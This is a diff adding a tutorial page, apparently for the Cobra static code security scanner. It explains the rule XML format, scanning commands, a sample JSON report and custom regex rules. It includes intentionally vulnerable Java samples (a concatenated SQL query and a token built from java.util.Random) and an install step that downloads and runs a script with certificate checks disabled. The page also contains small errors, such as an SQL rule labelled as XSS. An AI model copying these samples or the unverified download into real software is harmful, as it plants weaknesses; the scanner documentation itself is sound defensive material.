+&lt;repair <span class="org-variable-name">block</span>=<span class="org-string">""</span>&gt;&lt;![CDATA[regex content]]&gt;&lt;/repair&gt;
+
+level
+&#24433;&#21709;&#31561;&#32423; &#26159; integer &#26631;&#35760;&#35813;&#35268;&#21017;&#25195;&#21040;&#30340;&#28431;&#27934;&#21361;&#23475;&#31561;&#32423;&#65292;&#20351;&#29992;&#25968;&#23383;1-10&#12290;
+&lt;level <span class="org-variable-name">value</span>=<span class="org-string">"3"</span> /&gt;
+
+solution
+&#20462;&#22797;&#26041;&#26696; &#26159; string&#35813;&#35268;&#21017;&#25195;&#25551;&#30340;&#28431;&#27934;&#23545;&#24212;&#30340;&#23433;&#20840;&#39118;&#38505;&#21644;&#20462;&#22797;&#26041;&#26696;
+&lt;solution&gt;&#35814;&#32454;&#30340;&#23433;&#20840;&#39118;&#38505;&#21644;&#20462;&#22797;&#26041;&#26696;&lt;/solution&gt;
+
+test
+&#27979;&#35797;&#29992;&#20363; &#26159; case &#35813;&#35268;&#21017;&#23545;&#24212;&#30340;&#27979;&#35797;&#29992;&#20363;
+&lt;test&gt;&lt;case <span class="org-variable-name">assert</span>=<span class="org-string">"true"</span>&gt;&lt;![CDATA[&#27979;&#35797;&#23384;&#22312;&#28431;&#27934;&#30340;&#20195;&#30721;]]&gt;
+&lt;/case&gt;&lt;case <span class="org-variable-name">assert</span>=<span class="org-string">"false"</span>&gt;&lt;![CDATA[&#27979;&#35797;&#19981;&#23384;&#22312;&#28431;&#27934;&#30340;&#20195;&#30721;]]&gt;
+&lt;/case&gt;&lt;/test&gt;
+
+status
+&#26159;&#21542;&#24320;&#21551;
+&#26159; boolean&#26159;&#21542;&#24320;&#21551;&#35813;&#35268;&#21017;&#30340;&#25195;&#25551;&#65292;&#20351;&#29992; on / off &#26469;&#26631;&#35760;
+&lt;status <span class="org-variable-name">value</span>=<span class="org-string">"1"</span> /&gt;
+
+author
+&#35268;&#21017;&#20316;&#32773; &#26159; attr &#35268;&#21017;&#20316;&#32773;&#30340;&#22995;&#21517;&#21644;&#37038;&#31665;
+&lt;author <span class="org-variable-name">name</span>=<span class="org-string">"Feei"</span> <span class="org-variable-name">email</span>=<span class="org-string">"feei@feei.cn"</span> /&gt;
+</pre>
+</div>
+
+
+<p>
+<b>核心字段&lt;match&gt;/&lt;match2&gt;/&lt;repair&gt;编写规范</b>
+</p>
+
+<p>
+&lt;match&gt; Mode（ &lt;match&gt; 的规则模式）
+</p>
+<ul class="org-ul">
+<li>用来描述规则类型，只能用在 &lt;match&gt; 中。</li>
+</ul>
+
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">Mode</th>
+<th scope="col" class="org-left">类型</th>
+<th scope="col" class="org-left">默认模式</th>
+<th scope="col" class="org-left">支持语言</th>
+<th scope="col" class="org-left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">regex-onliy-match</td>
+<td class="org-left">正则仅匹配</td>
+<td class="org-left">是</td>
+<td class="org-left">*</td>
+<td class="org-left">默认是此模式，但需要显式的写在规则文件里。以正则的方式进行匹配，匹配到内容则算作漏洞</td>
+</tr>
+
+<tr>
+<td class="org-left">regex-param-controllable</td>
+<td class="org-left">正则参数可控</td>
+<td class="org-left">否</td>
+<td class="org-left">PHP/Java</td>
+<td class="org-left">以正则模式进行匹配，匹配出的变量可外部控制则为漏洞</td>
+</tr>
+
+<tr>
+<td class="org-left">function-param-controllable</td>
+<td class="org-left">函数参数可控</td>
+<td class="org-left">否</td>
+<td class="org-left">PHP</td>
+<td class="org-left">内容写函数名，将搜索所有该函数的调用，若参数外部可控则为漏洞。</td>
+</tr>
+
+<tr>
+<td class="org-left">find-extension</td>
+<td class="org-left">寻找指定后缀文件</td>
+<td class="org-left">否</td>
+<td class="org-left">*</td>
+<td class="org-left">找到指定后缀文件则算作漏洞</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+&lt;match2&gt; / &lt;repair&gt; Block（ &lt;match2&gt; / &lt;repair&gt; 的匹配区块）
+</p>
+<ul class="org-ul">
+<li>用来描述需要匹配的代码区块位置，只能用在 &lt;match2&gt; 或 &lt;repair&gt; 中。</li>
+</ul>
+
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">区块</th>
+<th scope="col" class="org-left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">in-current-line</td>
+<td class="org-left">由第一条规则触发的所在行</td>
+</tr>
+
+<tr>
+<td class="org-left">in-function</td>
+<td class="org-left">由第一条规则触发的函数体内</td>
+</tr>
+
+<tr>
+<td class="org-left">in-function-up</td>
+<td class="org-left">由第一条规则触发的所在行之上，所在函数体之内</td>
+</tr>
+
+<tr>
+<td class="org-left">in-function-down</td>
+<td class="org-left">由第一条规则触发的所在行之下，所在函数体之内</td>
+</tr>
+
+<tr>
+<td class="org-left">in-file</td>
+<td class="org-left">由第一条规则触发的文件内</td>
+</tr>
+
+<tr>
+<td class="org-left">in-file-up</td>
+<td class="org-left">由第一条规则触发的所在行之上，所在文件之内</td>
+</tr>
+
+<tr>
+<td class="org-left">in-file-down</td>
+<td class="org-left">由第一条规则触发的所在行之下，所在文件之内</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="outline-container-h:72fc1a01-f259-4bda-9c97-cbf07f251d08" class="outline-3">
+<h3 id="h:72fc1a01-f259-4bda-9c97-cbf07f251d08"><a href="#h:72fc1a01-f259-4bda-9c97-cbf07f251d08">Example</a></h3>
+<div class="outline-text-3" id="text-h:72fc1a01-f259-4bda-9c97-cbf07f251d08">
+</div>
+<div id="outline-container-h:7b479a29-655d-4226-b968-70e1e9bf22ef" class="outline-4">
+<h4 id="h:7b479a29-655d-4226-b968-70e1e9bf22ef"><a href="#h:7b479a29-655d-4226-b968-70e1e9bf22ef">使用测试代码进行扫描</a></h4>
+<div class="outline-text-4" id="text-h:7b479a29-655d-4226-b968-70e1e9bf22ef">
+<p>
+<b>Web服务模式</b>
+</p>
+
+<p>
+更改配置文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cp config.template config
+</pre>
+</div>
+
+<p>
+修改 secret_key 为自己的key值
+</p>
+
+<p>
+安装依赖
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">pip3 install -r requirements.txt
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>安装python3</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">yum install python3
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#23433;&#35013;pip
+</span>wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate
+python3 get-pip.py
+</pre>
+</div>
+
+<p>
+使用以下命令启动Web服务
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">python3 cobra.py -H 0.0.0.0 -P 8888
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>扫描github上的代码
+<ul class="org-ul">
+<li>直接输入git地址即可(亦可扫描公司内部的Gitlab服务上的代码)</li>
+<li>扫描完成后可以看到对应的扫描结果</li>
+</ul></li>
+
+<li>扫描本地代码
+<ul class="org-ul">
+<li>使用文件上传的方式扫描本地代码(需将代码文件打包成压缩包进行上传)</li>
+</ul></li>
+
+<li>使用web接口下发任务</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh">// &#35831;&#27714;&#20307;
+{
+    <span class="org-string">"key"</span>: <span class="org-string">"cici_key"</span>,
+    <span class="org-string">"target"</span>: <span class="org-string">"https://github.com/FeeiCN/dict.git:master"</span>,
+    <span class="org-string">"rule"</span>: <span class="org-string">"cvi-130003"</span>
+}
+// &#21709;&#24212;
+{
+    <span class="org-string">"code"</span>: 1001,
+    <span class="org-string">"result"</span>: {
+        <span class="org-string">"msg"</span>: <span class="org-string">"Add scan job successfully."</span>,
+        <span class="org-string">"sid"</span>: <span class="org-string">"ab9149nhvcal"</span>,
+        <span class="org-string">"total_target_num"</span>: 1
+    }
+}
+</pre>
+</div>
+
+<p>
+查询任务状态
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">{
+<span class="org-string">"key"</span>: <span class="org-string">"cici_key"</span>,
+<span class="org-string">"sid"</span>: <span class="org-string">"ab9149nhvcal"</span>
+}
+</pre>
+</div>
+
+<p>
+<b>CLI模式</b>
+</p>
+
+<p>
+命令：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#25991;&#20214;
+</span>python3 cobra.py -t tests/vulnerabilities/v.java
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#30446;&#24405;
+</span>python3 cobra.py -t tests/vulnerabilities
+</pre>
+</div>
+
+<p>
+使用全量规则对java文件进行扫描
+</p>
+
+<p>
+使用 -f 与 -o 选项输出扫描结果
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">python3 cobra.py -t tests/vulnerabilities -f json -o /tmp/report2.json
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#20351;&#29992; -r &#21487;&#25351;&#23450;&#35268;&#21017;
+</span>python3 cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002
+</pre>
+</div>
+
+<p>
+可以看到 json 格式的输出结果
+</p>
+</div>
+</div>
+<div id="outline-container-h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427" class="outline-4">
+<h4 id="h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427"><a href="#h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427">自定义规则</a></h4>
+<div class="outline-text-4" id="text-h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427">
+<p>
+先复制出一个规则模版
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cp CVI-140002.xml CVI-1400022.xml
+</pre>
+</div>
+
+<p>
+CVI-1400022.xml 规则文件
+使用正则表达式匹配 select from 语句中有 + 拼接的行
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="UTF-8"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">cobra</span> <span class="org-nxml-attribute-local-name">document</span>=<span class="org-string">"https://github.com/WhaleShark-Team/cobra"</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">name</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"&#36755;&#20986;&#20837;&#21442;&#21487;&#33021;&#23548;&#33268;XSS"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">language</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"java"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">match</span> <span class="org-nxml-attribute-local-name">mode</span>=<span class="org-string">"regex-only-match"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">select.*from.*\+.*</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">match</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">level</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"4"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">solution</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+    ## &#23433;&#20840;&#39118;&#38505;
+    &#26597;&#25214;select sql &#35821;&#21477;
+    ## &#20462;&#22797;&#26041;&#26696;
+    &#21442;&#25968;&#21270;&#26597;&#35810;
+  </span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">solution</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">test</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"true"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">select user from users where id = 1</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">test</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">status</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"on"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">author</span> <span class="org-nxml-attribute-local-name">name</span>=<span class="org-string">"Cici"</span> <span class="org-nxml-attribute-local-name">email</span>=<span class="org-string">"cici@cici.cn"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">cobra</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+<a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式教程</a>
+</p>
+
+<p>
+<b>扫描结果</b>
+</p>
+
+<p>
+json文件
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">{
+    <span class="org-string">"s6e97fel57zb"</span>:{
+        <span class="org-string">"extension"</span>:1,
+        <span class="org-string">"file"</span>:1,
+        <span class="org-string">"framework"</span>:<span class="org-string">"Unknown Framework"</span>,
+        <span class="org-string">"language"</span>:<span class="org-string">"java"</span>,
+        <span class="org-string">"push_rules"</span>:1,
+        <span class="org-string">"target_directory"</span>:<span class="org-string">"/root/cobra/tests/vulnerabilities"</span>,
+        <span class="org-string">"trigger_rules"</span>:1,
+        <span class="org-string">"vulnerabilities"</span>:[
+            {
+                <span class="org-string">"analysis"</span>:<span class="org-string">"REGEX-ONLY-MATCH(&#27491;&#21017;&#20165;&#21305;&#37197;+&#26080;&#20462;&#22797;&#35268;&#21017;)"</span>,
+                <span class="org-string">"code_content"</span>:<span class="org-string">"String hql = \"select max(detailLineNo) from TWmsSoreturnAsnDetailEntity where isDel = 0 and asnId=\"+headId;"</span>,
+                <span class="org-string">"commit_author"</span>:<span class="org-string">"Unknown"</span>,
+                <span class="org-string">"commit_time"</span>:<span class="org-string">"Unknown"</span>,
+                <span class="org-string">"file_path"</span>:<span class="org-string">"/v.java"</span>,
+                <span class="org-string">"id"</span>:<span class="org-string">"140002"</span>,
+                <span class="org-string">"language"</span>:<span class="org-string">"java"</span>,
+                <span class="org-string">"level"</span>:<span class="org-string">"4"</span>,
+                <span class="org-string">"line_number"</span>:<span class="org-string">"49"</span>,
+                <span class="org-string">"match_result"</span>:null,
+                <span class="org-string">"rule_name"</span>:<span class="org-string">"&#36755;&#20986;&#20837;&#21442;&#21487;&#33021;&#23548;&#33268;XSS"</span>,
+                <span class="org-string">"solution"</span>:<span class="org-string">"## &#23433;&#20840;&#39118;&#38505;\n &#36755;&#20986;&#20837;&#21442;&#20250;&#23548;&#33268;XSS\n\n ## &#20462;&#22797;&#26041;&#26696;\n&#20351;&#29992;Begis&#23545;&#21442;&#25968;&#36827;&#34892;&#36807;&#28388;&#21518;&#20877;&#36755;&#20986;"</span>
+            }
+        ],
+        <span class="org-string">"target"</span>:<span class="org-string">"tests/vulnerabilities/v.java"</span>
+    }
+}
+</pre>
+</div>
+
+<p>
+<b>多匹配条件规则分析</b>
+</p>
+
+<p>
+查看CVI-200001.xml 规则文件
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="UTF-8"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">cobra</span> <span class="org-nxml-attribute-local-name">document</span>=<span class="org-string">"https://github.com/WhaleShark-Team/cobra"</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">name</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"&#19981;&#23433;&#20840;&#30340;&#38543;&#26426;&#25968;"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">language</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"java"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">match</span> <span class="org-nxml-attribute-local-name">mode</span>=<span class="org-string">"regex-only-match"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">new Random\s*\(|Random\.next</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">match</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">match2</span> <span class="org-nxml-attribute-local-name">block</span>=<span class="org-string">"in-file-up"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">((java|scala)\.util\.Random)</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">match2</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">level</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"2"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+查看第一条规则,使用 match 标签， mode 为 regex-only-match ，意为使用正则匹配
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;match <span class="org-variable-name">mode</span>=<span class="org-string">"regex-only-match"</span>&gt;&lt;![CDATA[new Random\s*<span class="org-string">\(</span>|Random<span class="org-string">\.</span>next]]&gt;&lt;/match&gt;
+</pre>
+</div>
+
+<p>
+查看第二条规则 match2 ， block 为 in-file-up ,意为第二条规则匹配第一条规则所在文件行以上的内容
+</p>
+
+<p>
+可匹配的Java代码为
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">util</span>.<span class="org-type">Random</span>;
+
+<span class="org-comment-delimiter">// </span><span class="org-comment">CVI-200001
+</span><span class="org-type">String</span> <span class="org-function-name">generateSecretToken</span>() {
+    <span class="org-type">Random</span> <span class="org-variable-name">r</span> = <span class="org-keyword">new</span> <span class="org-type">Random</span>();
+    <span class="org-keyword">return</span> Long.toHexString(r.nextLong());
+}
+</pre>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+<div id="postamble" class="status">
+<!-- 这里曾经放过一个手动 AdSense 广告位（<ins> + push）。
+     问题：AdSense 要约 6 秒才把 data-ad-status 置为 unfilled，
+     在那之前填不出广告的空位会显示成一块黄色方块，体验很差。
+     现改为使用 Google 自动广告 —— 由 Google 决定何时何地插入，
+     没有广告时就不会创建空位。加载器已在 <head> 里，无需额外代码，
+     开关在 AdSense 后台的「自动广告」。 -->
+<script type="text/javascript" src="/static/aandds.com/js/postamble.js"></script>
+</div>
+</body>
+</html>
